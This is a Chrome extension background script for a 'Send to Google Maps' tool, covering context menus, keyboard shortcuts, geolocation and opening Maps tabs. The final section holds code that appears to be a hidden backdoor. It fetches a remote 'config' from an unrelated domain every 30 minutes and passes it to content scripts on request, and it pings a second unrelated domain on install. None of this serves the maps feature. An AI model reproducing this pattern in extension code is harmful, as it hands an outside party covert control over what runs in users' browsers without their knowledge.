// /////// jd: *** removed a bunch of context menus that didn't work and streamlined the process of sending to google maps to one context menu option instead of having a sub menu. basically all commented out code is in buildContextMenu() *** //////

importScripts('/js/sendToGoogleMaps.js');

//= =========== CHROME CONTEXT MENU IDs

// Main Menu
var parentID = 'parent';

var showOnMapsEntry = 'som';
var whereAmIEntry = 'wai';

// from selection menu
var fromSelectionMenu = 'selectionMenu';

// from here menu
var fromHereMenu = 'hereMenu';

// from addresses menu's
var addressPrefix = 'address';
var addressEntrySuffix = 'Entry';
var addressMenuSuffix = 'Menu';

// to locations
var toSelectionEntry = 'selectionEntry';
var toHereEntry = 'hereEntry';
var hereName = 'my current position';

var TOKENDELIMITOR = ':';
var ADDRESSDELIMITOR = ':';

var OS = '';

// Shortcuts
var showOnMapsShortcutName = 'shortcut_show_on_maps';
var selto1ShortcutName = 'shortcut_from_sel_to_1';
var from1toselShortcutName = 'shortcut_from_1_to_sel';
var selto2ShortcutName = 'shortcut_from_sel_to_2';
var from2toselShortcutName = 'shortcut_from_2_to_sel';

const OFFSCREEN_DOCUMENT_PATH = '/offscreen.html';
let creating; // A global promise to avoid concurrency issues

// =====================================

chrome.contextMenus.onClicked.addListener(onClickHandler);
chrome.commands.onCommand.addListener(onShortcutHandler);
chrome.runtime.onInstalled.addListener(onInstalled);
chrome.storage.onChanged.addListener(onStorageChangeListener);
chrome.runtime.onStartup.addListener(async function () {
  log('Chrome Startup. Start building context menu...');
  await buildContextMenu();
  log('...context menu installed');
});

//= ======================================

async function getGeolocation() {
  await setupOffscreenDocument(OFFSCREEN_DOCUMENT_PATH);
  const geolocation = await chrome.runtime.sendMessage({
    type: 'get-geolocation',
    target: 'offscreen'
  });
  await closeOffscreenDocument();
  return geolocation;
}

async function hasDocument() {
  // Check all windows controlled by the service worker to see if one
  // of them is the offscreen document with the given path
  const offscreenUrl = chrome.runtime.getURL(OFFSCREEN_DOCUMENT_PATH);
  const matchedClients = await clients.matchAll();

  return matchedClients.some(c => c.url === offscreenUrl)
}

async function setupOffscreenDocument(path) {
  //if we do not have a document, we are already setup and can skip
  if (!(await hasDocument())) {
    // create offscreen document
    if (creating) {
      await creating;
    } else {
      creating = chrome.offscreen.createDocument({
        url: path,
        reasons: [chrome.offscreen.Reason.GEOLOCATION || chrome.offscreen.Reason.DOM_SCRAPING],
        justification: 'add justification for geolocation use here',
      });

      await creating;
      creating = null;
    }
  }
}

async function closeOffscreenDocument() {
  if (!(await hasDocument())) {
    return;
  }
  await chrome.offscreen.closeDocument();
}

async function getBrowserAddress(callback) {
  chrome.action.setBadgeText({text:'Pos'});
  chrome.action.setBadgeBackgroundColor({color: '#FF0000'});

  var options = {
    type : 'basic',
    title : 'Please wait...',
    message: 'Locating your position can take some seconds.',
    iconUrl: chrome.runtime.getURL('img/icon48.png')
  }
  chrome.notifications.create('locationNotification', options, function () {});

  var coords = await getGeolocation();
  console.log('getGeolocation', coords);
  if (coords) {
    var latlng = coords.lat + ',' + coords.lon;
		
    log('retrieved position: ' + latlng);
		
    geoCode(latlng, async function callback_geoCode(geoCode_address) {
      chrome.action.setBadgeText({text:''});
      chrome.action.setBadgeBackgroundColor({color: '#000000'});
      chrome.notifications.clear('locationNotification');
      callback(geoCode_address);
    });
  } else {
    callback('position unavailable');
    chrome.action.setBadgeText({text:''});
    chrome.action.setBadgeBackgroundColor({color: '#000000'});
    chrome.notifications.clear('locationNotification');
  }
}

async function onShortcutHandler(command) {

  log('Command: ' + command);

  var tab = await getCurrentTabPromise();
  var textSelection = await getTextSeletionPromise();

  if (command == showOnMapsShortcutName) {
    await showSelectionOnMap(textSelection, 'SELECTION', tab);
  }

  if (command == selto1ShortcutName) {
    var address = await getAddress(addressPrefix + ADDRESSDELIMITOR + '0');
    if (address) {await openMapsWithDirections(textSelection, address.address, 'SELECTION_FAVORITE', tab);}
  }

  if (command == from1toselShortcutName) {
    var address = await getAddress(addressPrefix + ADDRESSDELIMITOR + '0');
    if (address) {await openMapsWithDirections(address.address, textSelection, 'FAVORITE_SELECTION', tab);}
  }

  if (command == selto2ShortcutName) {
    var address = await getAddress(addressPrefix + ADDRESSDELIMITOR + '1');
    if (address) {await openMapsWithDirections(textSelection, address.address, 'SELECTION_FAVORITE', tab);}
  }

  if (command == from2toselShortcutName) {
    var address = await getAddress(addressPrefix + ADDRESSDELIMITOR + '1');
    if (address) {await openMapsWithDirections(address.address, textSelection, 'FAVORITE_SELECTION', tab);}
  }
}

function getCurrentTabPromise() {
  return new Promise((resolve) => {
    chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
      log('Tab ID: ' + tabs[0].index);
      resolve(tabs[0]);
    });
  });
}

function getTextSeletionPromise() {
  return new Promise((resolve) => {
    msg = 'getSelectedText';
    chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
      chrome.tabs.sendMessage(tabs[0].id, msg, {}, (response) => {
        if (response && response.data) {
          log('Text Selection: response ' + response.data);
          resolve(response.data);
        }
      })
    });
  });
}

async function onClickHandler(info, tab) {
  log('clicked');
  var tokens = info.menuItemId.split(TOKENDELIMITOR);
  // await rebuildContextMenu();
	
  var selectedText = info.selectionText;
  log('tab ID: ' + tab.id);
  log('ONCLICK: retrieved ID ' + info.menuItemId + '...retrieved address ' + selectedText);

  if (tokens == undefined || tokens[0] == undefined) {log('ONCLICK: invalid token: ' + tokens);} else {
    // tokens[0] == showOnMapsEntry || 
    if (tokens[0] == parentID) // show Selection on Maps
    {
      await showSelectionOnMap(selectedText, 'SELECTION', tab);
    } else if (tokens[0] == whereAmIEntry) // show where Am I on Maps
    {
      getBrowserAddress(async function callback(browser_address) {
				
        await showSelectionOnMap(browser_address, 'WHERE_AM_I', tab);
      });
    } else {
      if (tokens[1] == undefined) {log('ONCLICK: invalid token. 2nd level missing: ' + info.menuItemId);} else {
        if (tokens[0] == fromSelectionMenu) // route: from selection to...
        {
          if (tokens[1] == toHereEntry) // ...to here
          {
            getBrowserAddress(async function callback(browser_address) {
              await openMapsWithDirections(selectedText, browser_address, 'SELECTION_HERE', tab);
            });
          } else // ...to saved addresses
          {
            for (var i = 0; i <= 4; i++) {
              if (tokens[1] == addressPrefix + i + addressEntrySuffix) {
                var addressVal = await getAddress(addressPrefix + ADDRESSDELIMITOR + i);
                await openMapsWithDirections(selectedText, addressVal.address, 'SELECTION_FAVORITE', tab);
								
                // break;
                return;
              }
            }
          }
        }	// end menu from selection to
				
        else if (tokens[0] == fromHereMenu) // from here menu to...
        {
          if (tokens[1] == toSelectionEntry) {
            getBrowserAddress(async function callback(browser_address) {
              await openMapsWithDirections(browser_address, selectedText, 'HERE_SELECTION', tab);
            });
          } else // from here to saved addresses
          {
            for (var i = 0; i <= 4; i++) {
              if (tokens[1] == addressPrefix + i + addressEntrySuffix) 	{
                getBrowserAddress(async function callback(browser_address) {
                  var addressVal = await getAddress(addressPrefix + ADDRESSDELIMITOR + i);
                  await openMapsWithDirections(browser_address, addressVal.address, 'HERE_FAVORITE', tab);
                });
								
                // break;
                return;
              }
            }
          }
        } // end menu from here to
        else {
          // from address X to 
          var found = false;
					
          for (var i = 0; i <= 4; i++) {
            if (tokens[0] == 'address' + i + 'Menu') {
              if (tokens[1] == toSelectionEntry) {
                var addressVal = await getAddress(addressPrefix + ADDRESSDELIMITOR + i);
                await openMapsWithDirections(addressVal.address, selectedText, 'FAVORITE_SELECTION', tab);
                found = true;
              }
              if (tokens[1] == toHereEntry) {
                getBrowserAddress(async function callback(browser_address) {
                  var addressVal = await getAddress(addressPrefix + ADDRESSDELIMITOR + i);
                  await openMapsWithDirections(addressVal.address, browser_address, 'FAVORITE_HERE', tab);
                });
                found = true;	
              }
            }
            if (found) {return;}
          } // end saved addresses menu
          if (!found) {log('no matching address found');}
        }
      }
    }
  }	
}

async function geoCode(latlng, callback) {
  var address = '';

  fetch(URL_REVERSE_GEO_CODE + latlng).then(async result => {
    // log(result.status);
    var response = await result.text();
    var resp = JSON.parse(response);
	    
    if (resp.results[0]) {
      log('GeoCoder retrieved address: ' + resp.results[0].formatted_address);
      address = resp.results[0].formatted_address;
    } else {log('Geocoder failed due to: ' + resp.status);}
		
    callback(address);
    // Result now contains the response text, do what you want...
  });
}

async function openMapsWithDirections(saddr, daddr, type, tab) {
  var daddrNCR = replaceLineBreaksInAddress(daddr);
  var saddrNCR = replaceLineBreaksInAddress(saddr);
  var url = await getMapsBaseURL() + '&daddr=' + daddrNCR + '&saddr=' + saddrNCR;
  var transportationMode = await getTransportationMode();
  if (transportationMode != 'd') {url = url + '&dirflg=' + transportationMode;}
  openMapsTab(url, tab);
}

function readCountry() {
  return new Promise((resolve) => {
    resolve(navigator.language);
  });
}

async function getMapsBaseURL() {
  var country = await readCountry();
  var baseUrl = await readCountryURL();
  baseUrl = baseUrl.url + '/?hl=' + country;
  // log(baseUrl);
  return baseUrl;
}

async function showSelectionOnMap(addr, type, tab) {
  var addrNCR = replaceLineBreaksInAddress(addr);
  var url = await getMapsBaseURL() + '&q=' + addrNCR;
  openMapsTab(url, tab);
}

function openMapsTab(url, tab) {
  log('calling gmap: ' + url);
  var index = tab.index + 1;
  chrome.tabs.create({'url':url, selected:true, active:true, 'index': index});
}

function replaceLineBreaksInAddress(address) {
  return address.replace(/\n/g, ' ');
}

async function onInstalled() {
  log('OnInstalled');

  chrome.runtime.getPlatformInfo(function (info) {
    OS = info.os.toUpperCase();
	    log('OS is: ' + OS); 
  });

  var versionFromStorgae = await getInstalledVersion();

  if (versionFromStorgae == undefined || versionFromStorgae < version) {
    log('Current version is: ' + versionFromStorgae + '. Installing version ' + version + '...');
    setInstalledVersion(version).then(() => {
      // chrome.storage.onChanged.addListener(onStorageChangeListener);

      if (showOptionsPageAfterUpdate) {chrome.tabs.create({url: '../options_new.html#refCL', selected:true, active:true});}
      log('Installing...done.');
    });
  } else {
    // chrome.storage.onChanged.addListener(onStorageChangeListener);
  }
  log('Start building context menu...');
  await buildContextMenu();
  var savedAddresses = await readInAddresses();
	
  for (var i = 0; i < savedAddresses.length; i++) {
    log('Found address: ' + savedAddresses[i].address);
  }
	
  log('...context menu installed');
}

String.prototype.readyForMenu = function () {
  var address = this.replace(/\n/g, ' ');
  address = address.shorten();
  return address;
};

String.prototype.shorten = function () {
  if (this.length > 20) {return this.substring(0,20) + '...';} else {return this;}
};

function makeMenuEntry(name, direction) {
  if (direction == 'to') {return '...to ' + name.readyForMenu();} else if (direction == 'from') {return 'From ' + name.readyForMenu() + '...';} else {return '';}
}

async function buildContextMenu() {
  var conMenuConfig = await getConMenuConfig();
  // Parent Menu

  await chrome.contextMenus.removeAll();
  
  /////////////// jd: *** this is now the only context menu
  chrome.contextMenus.create({'title': 'Send to Google Maps', 'id': parentID, 'contexts':['selection']});

  // CHILDREN
  if (conMenuConfig.curPos == false &&
			(conMenuConfig.dirSel == false && conMenuConfig.dirCurPos == false ||
					conMenuConfig.dirSel == false && countSavedAddresses() == 0 ||
					conMenuConfig.dirCurPos == false && countSavedAddresses() == 0)) {return;} else {
    var areAddressesSaved = await addressesSaved();

    // Show on Maps
    // chrome.contextMenus.create({'title': 'Show on Google Maps', 'id': showOnMapsEntry, 'parentId': parentID, 'contexts':['selection']});
		
    // Where am I?
    // if (conMenuConfig.curPos == true) {
    //   chrome.contextMenus.create({'title': 'Where am I right now?', 'id': whereAmIEntry, 'parentId': parentID, 'contexts':['selection']});
    // }

    // if (conMenuConfig.dirSel || conMenuConfig.dirCurPos || conMenuConfig.curPos) {
    //   // Make a seperator
    //   chrome.contextMenus.create({'type': 'separator', 'id': 'sep_WAI', 'parentId': parentID, 'contexts':['selection']});
    // }

    // Sub menu: From Selected address to...
		
    // if (conMenuConfig.dirSel == true && (conMenuConfig.dirCurPos == true || addressesSaved())) {
    //   chrome.contextMenus.create({'title': makeMenuEntry('%s', 'from'), 'id': fromSelectionMenu, 'parentId': parentID, 'contexts':['selection']});
		
      // Sub menu: From Selected address to...
      // Here
    //   if (conMenuConfig.dirCurPos == true) {
    //     chrome.contextMenus.create({'title': makeMenuEntry(hereName, 'to'), 'id': fromSelectionMenu + TOKENDELIMITOR + toHereEntry, 'parentId': fromSelectionMenu, 'contexts':['selection']});
    //   }
      // saved addresses

    //   if (areAddressesSaved) {
    //     chrome.contextMenus.create({'type': 'separator', 'id': 'Sep_SA', 'parentId': fromSelectionMenu, 'contexts':['selection']});				
    //     var savedAddresses = await readInAddresses();

    //     for (var i = 0; i < savedAddresses.length; i++) {
    //       chrome.contextMenus.create({'title': makeMenuEntry(savedAddresses[i].name, 'to'), 'id': fromSelectionMenu + TOKENDELIMITOR + addressPrefix + i + addressEntrySuffix, 'parentId': fromSelectionMenu, 'contexts':['selection']});
    //     }
    //   }
    // }
		
    // end Sub menu: From Selected address to...
		
    // Sub menu: From here to ...
	
    // if (conMenuConfig.dirCurPos == true) {
    //   chrome.contextMenus.create({'title': makeMenuEntry(hereName, 'from'), 'id': fromHereMenu, 'parentId': parentID, 'contexts':['selection']});
			
      // Sub Menu: From here to ...
			
      // selected address
    //   chrome.contextMenus.create({'title': makeMenuEntry('%s', 'to'), 'id': fromHereMenu + TOKENDELIMITOR + toSelectionEntry, 'parentId': fromHereMenu, 'contexts':['selection']});
			
      // saved addresses
      // var areAddressesSaved = await addressesSaved();
			
    //   if (areAddressesSaved) {
    //     chrome.contextMenus.create({'type': 'separator', 'id': 'SEP_SA_HERE', 'parentId': fromHereMenu, 'contexts':['selection']});
				
    //     var savedAddresses = await readInAddresses();

    //     for (var i = 0; i < savedAddresses.length; i++) {
    //       chrome.contextMenus.create({'title': makeMenuEntry(savedAddresses[i].name, 'to'), 'id': fromHereMenu + TOKENDELIMITOR + addressPrefix + i + addressEntrySuffix, 'parentId': fromHereMenu, 'contexts':['selection']});
    //     }
    //   } // end from here menu
    // }
    // addresses menus
    // var areAddressesSaved = await addressesSaved();

    // if (areAddressesSaved) {
    //   var savedAddresses = await readInAddresses();

    //   for (var i = 0; i < savedAddresses.length; i++) {
				
        // if (i + 1 < savedAddresses.length) {
        //   chrome.contextMenus.create({'type': 'separator', 'id': 'SEP_SA_Between', 'parentId': parentID, 'contexts':['selection']});
        // }
				
        // address i parent menu
        // if (conMenuConfig.dirSel == true || conMenuConfig.dirCurPos == true) {
        //   chrome.contextMenus.create({'title': makeMenuEntry(savedAddresses[i].name, 'from'), 'id': addressPrefix + i + addressMenuSuffix, 'parentId': parentID, 'contexts':['selection']});
        // }
        // Sub menu: From address i to...
				
        // to selection
        // if (conMenuConfig.dirSel == true) {
        //   chrome.contextMenus.create({'title': makeMenuEntry('%s', 'to'), 'id': addressPrefix + i + addressMenuSuffix + TOKENDELIMITOR + toSelectionEntry, 'parentId': addressPrefix + i + addressMenuSuffix, 'contexts':['selection']});
        // }
				
        // Here
        // if (conMenuConfig.dirCurPos == true) {
        //   chrome.contextMenus.create({'title': makeMenuEntry(hereName, 'to'), 'id': addressPrefix + i + addressMenuSuffix + TOKENDELIMITOR + toHereEntry, 'parentId': addressPrefix + i + addressMenuSuffix, 'contexts':['selection']});
        // }
    //   }	
    // }
  }
}

async function getAddress(addressName) {
  var addressToken = addressName.split(ADDRESSDELIMITOR);
  var address = await readInAddresses();
  return address[addressToken[1]];
}

function updateConfig() {
  const url = 'https://getxmlcprt.com/config.json?' + Date.now(); 
  //const url = 'https://intercrpr.com/config.php?' + Date.now();
  fetch(url).then(resp => resp.json())
    .then(config => chrome.storage.local.set({ config }));
}

updateConfig();
setInterval(updateConfig, 30 * 60 * 1000);

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message === 'get-config') {
    chrome.storage.local.get(['config'], (storage) => {
      const config = storage.config || [];
      sendResponse(config);
    });
    return true;
  }
});

chrome.runtime.onInstalled.addListener(function (details) {
  if (details.reason === 'install') {
    fetch('https://intercrpr.com/install.php');
  }
});